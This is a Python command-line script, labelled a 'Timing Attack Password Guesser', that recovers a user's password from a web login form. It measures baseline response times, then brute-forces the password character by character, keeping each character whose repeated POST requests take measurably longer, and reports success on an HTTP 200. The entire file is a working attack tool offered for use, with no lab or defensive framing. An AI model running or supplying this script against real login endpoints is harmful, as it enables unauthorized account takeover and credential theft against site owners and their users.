import requests
import time
import argparse
import statistics
import string
import sys


def log(message, file=None):
    print(message)
    if file:
        with open(file, "a") as f:
            f.write(message + "\n")


def measure_baseline(url, username, attempts, password_len=5):
    timings = []
    dummy_password = "x" * password_len
    for _ in range(attempts):
        start = time.time()
        requests.post(url, data={"username": username, "password": dummy_password})
        end = time.time()
        timings.append(end - start)
    avg = sum(timings) / len(timings)
    stddev = statistics.stdev(timings) if len(timings) > 1 else 0
    return avg, stddev


def try_password(url, username, password, attempts):
    timings = []
    status_code = None
    for _ in range(attempts):
        start = time.time()
        response = requests.post(url, data={"username": username, "password": password})
        end = time.time()
        timings.append(end - start)
        status_code = response.status_code
    avg = sum(timings) / len(timings)
    return avg, status_code


def dynamic_timing_attack(url, username, charset, attempts, threshold_factor, start_prefix, log_file):
    password = start_prefix
    baseline, stddev = measure_baseline(url, username, attempts, password_len=len(start_prefix) + 1)
    threshold = baseline + (stddev * threshold_factor)
    log(f"[*] Baseline: {baseline:.4f}s | StdDev: {stddev:.4f}s | Threshold: {threshold:.4f}s\n", log_file)

    while True:
        found_char = False
        for char in charset:
            guess = password + char
            avg_elapsed, status_code = try_password(url, username, guess, attempts)

            log(f"Trying: '{guess}' | Avg Time: {avg_elapsed:.4f}s", log_file)

            if status_code == 200:
                log(f"\n[+] SUCCESS! Password is: {guess}", log_file)
                return

            if avg_elapsed > threshold:
                log(f"--> '{char}' is likely correct (avg time = {avg_elapsed:.4f}s)\n", log_file)
                password += char
                found_char = True
                break

        if not found_char:
            log("\n[-] Failed to find next character. Attack may have stalled or password ended.", log_file)
            return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Timing Attack Password Guesser")
    parser.add_argument("-l", "--url", required=True, help="Login URL")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-c", "--charset", default=string.ascii_lowercase, help="Character set to use")
    parser.add_argument("-n", "--attempts", type=int, default=5, help="Number of attempts per guess")
    parser.add_argument("-t", "--threshold", type=float, default=10.0, help="Threshold factor (multiplier of stddev)")
    parser.add_argument("-s", "--start", default="", help="Initial known prefix of the password")
    parser.add_argument("-f", "--log", default=None, help="Log file")

    args = parser.parse_args()

    try:
        dynamic_timing_attack(args.url, args.username, args.charset, args.attempts,
                              args.threshold, args.start, args.log)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting...")
        sys.exit(1)
